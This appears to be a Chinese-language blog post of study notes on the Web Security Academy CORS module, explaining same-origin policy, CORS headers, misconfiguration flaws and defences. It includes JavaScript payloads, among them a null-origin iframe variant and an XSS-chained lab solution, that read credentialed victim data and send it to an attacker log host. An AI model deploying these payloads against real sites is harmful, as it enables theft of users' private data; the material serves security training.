---
layout: article
title: WSAcademy 12 -- CORS
mathjax: true
key: a00023
cover: /bkgs/1.png
modify_date: 2021-10-19
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- CORS
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的CORS部分<!--more-->

原文：[What is CORS (cross-origin resource sharing)](https://portswigger.net/web-security/csrf)

# What is CORS?

CORS (cross-origin resource sharing)是一种浏览器机制，允许对位于给定域之外的资源进行受控访问

它扩展并增加了same-origin policy（SOP）的灵活性

它可能会受到CSRF的攻击

# Same-origin policy（SOP）

限制网站与源域之外的资源交互的能力

对其他域**请求但不响应**。

限制一个源上的脚本访问另一个源上的数据

**Only** **same scheme, domain, and port** **would be allowed , like :**

| **URL accessed**                         | **Access permitted?**               |
| ---------------------------------------- | ----------------------------------- |
| h ttp://normal-website.com/example/      | Yes:  same scheme, domain, and port |
| ht tp://normal-website.com/example2/     | Yes:  same scheme, domain, and port |
| htt ps://normal-website.com/example/     | No:  different scheme and port      |
| http ://en.normal-website.com/example/   | No:  different domain               |
| http ://w ww.normal-website.com/example/ | No:  different domain               |
| htt p://normal-website.com:8080/example/ | No:  different port*                |

## Why is the same-origin policy necessary?

当浏览器从一个源向另一个源发送HTTP请求时，与另一个域相关的任何cookie（包括身份验证会话cookie）也会作为请求的一部分发送

**意味着响应将在用户会话中生成**，并包括特定于用户的任何相关数据。

## How is the same-origin policy implemented?

页面资源的跨源加载通常是允许的，比如`<img><video><script>`标签；

但是，页面上的任何JavaScript都无法读取这些资源的内容。

same-origin policy的例外情况：

- 可写但不可读的跨域对象：来自iFrame或新窗口的location对象或location.href属性。

- 可读但不可写：window对象的length属性和closed属性。

- 替换函数通常可以在location对象上跨域调用。

- 您可以跨域调用某些函数。例如，可以 `close, blur and focus` 新窗口的函数。还可以在iFrame和新窗口上调用`postMessage`函数，以便将消息从一个域发送到另一个域。

Cookie通常可以从站点的所有子域访问。使用`HttpOnly` cookie标志来降低风险。

可以使用`document.domain`放宽同源策略，但前提是它是**FQDN**（完全限定域名）的一部分

## Relaxation of the same-origin policy

比较可控但宽松的同源策略就是用cross-origin resource sharing (CORS).

# CORS and the Access-Control-Allow-Origin response header

CORS 规范通过使用HTTP头的集合，为从一个网站域到另一个网站域的HTTP请求提供了受控的同源策略放宽

访问控制允许来源标头包含在一个网站对来自另一个网站的请求的响应中，并标识请求的允许来源。web浏览器将访问控制允许来源与请求网站的来源进行比较，如果它们匹配，则允许访问响应。

## Implementing simple cross-origin resource sharing

CORS 规范规定了web服务器和浏览器之间交换的头内容，这些头内容限制了源域之外的web资源请求的源

CORS规范确定了一组协议头，其中`Access-Control-Allow-Origin`是最重要的

浏览器将允许在normal-website.com上运行的代码访问响应，因为origins匹配。

## Handling cross-origin resource requests with credentials

跨域服务器可以通过将CORS Access-Control-Allow-credentials标头设置为true，在向其传递凭据时允许读取响应

```http
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

然后，浏览器将允许请求网站读取响应，否则，浏览器将不允许访问响应。

## Relaxation of CORS specifications with wildcards

The header Access-Control-Allow-Origin supports wildcards. For example:

```
Access-Control-Allow-Origin: *
```

Note that wildcards cannot be used within any other value. For example, the following header is **not** valid:

```
Access-Control-Allow-Origin: https://*.normal-website.com
```

但是，不能将通配符与凭证的cross-origin传输结合起来

## Pre-flight checks

在某些情况下，当跨域请求包含非标准HTTP方法或标头时，跨源请求之前会有一个使用`OPTIONS`方法的请求，CORS协议要求在允许跨源请求之前，首先检查允许哪些方法和标头。这叫做Pre-flight checks。服务器返回一个允许的方法列表，除了受信任的来源外，浏览器还会检查请求网站的方法是否允许。

## Does CORS protect against CSRF?

并不会，没配置好的话甚至会加深影响

# Vulnerabilities arising from CORS configuration issues

## Server-generated ACAO header from client-specified Origin header

ACAO(Access-Control-Allow-Origin

维护一个允许的域列表需要持续的努力，任何错误都有破坏功能的风险

因此，一些应用程序采取简单的方法，有效地**允许从任何其他域进行访问**。

One way to do this is by allow-origin site where request gives

For example, consider an application that receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It then responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

If the response contains any sensitive information such as an API key or [CSRF token](https://portswigger.net/web-security/csrf/tokens), you could retrieve this by placing the following script on your website:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
```

## Errors parsing Origin headers

一些支持从多个来源访问的应用程序通过使用允许来源的**白名单**来实现

在实施CORS源白名单时，经常会出现错误。一些机构**允许从其所有子域进行访问**

实现中的任何错误都可能导致授予意外的外部域访问权限。

## Whitelisted null origin value

Origin header的规范支持值null。某些应用程序可能会将空源代码列入白名单，以支持应用程序的本地开发

在这种情况下，攻击者可以使用各种技巧生成一个跨域请求，该请求在源报头中包含null值

例如，这可以使用沙盒iframe cross-origin请求完成，其形式如下：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Exploiting XSS via CORS trust relationships

如果网站信任易受跨站点脚本（XSS）攻击的源站，则攻击者可以利用XSS注入一些JavaScript，使用CORS从信任易受攻击应用程序的网站检索敏感信息。

```
like：
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## Breaking TLS with poorly configured CORS

假设一个严格使用HTTPS的应用程序也列出了一个使用普通HTTP的受信任子域。

在这种情况下，能够拦截受害者用户流量的攻击者可以利用CORS配置来破坏受害者与应用程序的交互

1. 受害者用户发出任何普通的HTTP请求。

2. 攻击者将重定向到：http://trusted-subdomain.vulnerable-website.com

3. 受害者的浏览器遵循重定向。

4. 攻击者拦截普通HTTP请求，并将包含CORS请求的假响应返回到：https://vulnerable-website.com

5. 受害者的浏览器会发出CORS请求，包括来源：http://trusted-subdomain.vulnerable-website.com

6. 应用程序允许该请求，因为这是一个白名单源。请求的敏感数据在响应中返回。

7. 攻击者的欺骗页面可以读取敏感数据并将其传输到攻击者控制的任何域。

```javascript
lab：
<script>
document.location="http://stock.ace41fb31e42884680cd1cbf0021006a.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://ace41fb31e42884680cd1cbf0021006a.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://ace41faa1e6d884a80751c0e01fc0091.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"		
</script>
```

## Intranets and CORS without credentials

Most CORS attacks rely on the presence of the response header:

`Access-Control-Allow-Credentials: true`

内部网站的安全标准通常低于外部网站，使攻击者能够发现漏洞并获得进一步访问

```
lab:???
First we need to scan the local network for the endpoint
test xss 
get source of admin page
delete carlos
https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack
```

# How to prevent CORS-based attacks

主要是因为配置错误

- 正确配置跨域请求

  如果web资源包含敏感信息，则应在`Access-Control-Allow-Origin`标头中正确指定来源。

- 仅允许受信任的站点

  避免使用 `Access-Control-Allow-Origin: null`

  内部文档和沙盒请求可以指定 `null` origin

- 避免在内部网络中使用通配符

  避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅依靠网络配置来保护内部资源是不够的。

- CORS不能替代服务器端安全策略

  CORS定义了浏览器行为，但永远不能替代敏感数据的服务器端保护——攻击者可以直接伪造来自任何可信来源的请求。因此，除了正确配置的COR之外，web服务器还应该继续对敏感数据应用保护，例如身份验证和会话管理。